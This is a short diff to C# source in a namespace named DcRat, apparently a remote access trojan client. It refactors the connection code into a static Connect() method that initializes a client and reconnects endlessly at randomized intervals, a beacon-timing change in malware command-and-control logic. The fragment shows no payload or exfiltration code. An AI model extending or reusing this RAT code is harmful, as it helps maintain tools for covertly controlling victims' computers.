@@ -5,6 +5,7 @@ using System;
 using System.Drawing;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace DcRat
@@ -347,30 +348,29 @@ namespace DcRat
             }
         }
 
-        private void FormMain_Load(object sender, EventArgs e)
+        public async static void Connect()
         {
-            using (FormInit formInit = new FormInit())
+            try
             {
-                formInit.ShowDialog();
-            }
-            
-            Thread thread = new Thread(() =>
-            {
+                await Task.Delay(1000);
+                Connection.InitializeClient();
                 while (true)
                 {
-                    try
-                    {
-                        if (!Connection.IsConnected)
-                        {
-                            Connection.Reconnect();
-                        }
-                    }
-                    catch { }
-                    Thread.Sleep(5000);
+                    if (!Connection.IsConnected)
+                        Connection.Reconnect();
+                    Thread.Sleep(new Random().Next(5000));
                 }
-            });
-            thread.IsBackground = true;
-            thread.Start();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                Environment.Exit(0);
+            }
+        }
+
+        private void FormMain_Load(object sender, EventArgs e)
+        {
+            
         }
     }
 }
